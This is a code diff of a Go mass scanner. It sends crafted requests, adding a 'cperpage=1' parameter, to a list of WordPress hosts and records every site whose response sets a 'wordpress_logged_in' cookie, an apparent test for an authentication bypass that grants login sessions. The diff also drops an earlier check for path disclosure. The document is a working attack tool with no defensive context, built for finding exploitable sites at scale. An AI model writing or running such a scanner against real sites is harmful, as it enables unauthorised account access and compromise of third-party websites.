@@ -2,13 +2,11 @@ package main
 
 import (
 	"bufio"
-	"io/ioutil"
 	"log"
 	"net"
 	"net/http"
 	"net/url"
 	"os"
-	"regexp"
 	"runtime"
 	"strings"
 	"time"
@@ -21,8 +19,11 @@ func main() {
 
 	logger = CustomLogger("run.log")
 
-	// initWorkers, jobQueueLen(maxWorkers), feedback mechanism
-	pool := NewGoroutinePool(1000, 20000, false)
+	// initWorkers, jobQueueLen(maxWorkers), feedback-mechanism
+	// if you set a fixed number of goroutine, set feedback-mechanism `false` and initWorkers == jobQueueLen`
+	// Example: pool = NewGoroutinePool(1000, 1000, false)
+	// if you want feedback-mechanism, set `feedback = true`, initWorkers and jobQueueLen
+	pool := NewGoroutinePool(1000, 20000, true)
 
 	urlFile := "./wordpress.txt"
 	fd, err := os.Open(urlFile)
@@ -62,9 +63,9 @@ func fetchURL(targetURL PayloadType) {
 		},
 	}
 	requestURL := "http://" + string(targetURL)
-	// requestURL := "http://" + "baidu.com" + "/index.php"
 	parseRequestURL, _ := url.Parse(requestURL)
 	extraParams := url.Values{
+		"cperpage": {"1"},
 		"spiderZz": {"Zz:0.6.1"},
 	}
 	parseRequestURL.RawQuery = extraParams.Encode()
@@ -94,8 +95,8 @@ func fetchURL(targetURL PayloadType) {
 		return
 	}
 
-	// save target-url to file
-	if absolutePath, ok := checkVul(resp); ok {
+	// save result to file
+	if checkVul(resp.Cookies()) {
 		resultFile := "./result.txt"
 		outFd, err := os.OpenFile(resultFile, os.O_APPEND|os.O_WRONLY, 0600)
 		if err != nil {
@@ -103,24 +104,26 @@ func fetchURL(targetURL PayloadType) {
 		}
 		defer outFd.Close()
 		outWriter := bufio.NewWriter(outFd)
-		outWriter.WriteString(string(targetURL) + "," + absolutePath + "\n")
+		outWriter.WriteString(string(targetURL) + "\n")
 		outWriter.Flush()
 		return
 	}
 	return
 }
 
-func checkVul(resp *http.Response) (string, bool) {
-	respData, err := ioutil.ReadAll(resp.Body)
-	if err != nil {
-		logger.Println(err)
-		return "", false
+func checkVul(cookies []*http.Cookie) bool {
+	// check cookie weather contain 'wordpress_logged_in_a73583346e4e31e82679e314e723fe41'
+	for _, v := range cookies {
+		if strings.Index(v.Name, "wordpress_logged_in") > -1 && len(v.Value) > 16 {
+			if strings.Index(v.Value, "%") > -1 {
+				return true
+			}
+		}
+		if strings.Index(v.Name, "wordpress_") > -1 && len(v.Value) > 16 {
+			if strings.Index(v.Value, "%") > -1 {
+				return true
+			}
+		}
 	}
-	r, _ := regexp.Compile(`vul_function\(\) in <b>(.+?)</b>`)
-
-	regxResult := r.FindStringSubmatch(string(respData))
-	if len(regxResult) == 2 {
-		return regxResult[1], true
-	}
-	return "-", false
+	return false
 }
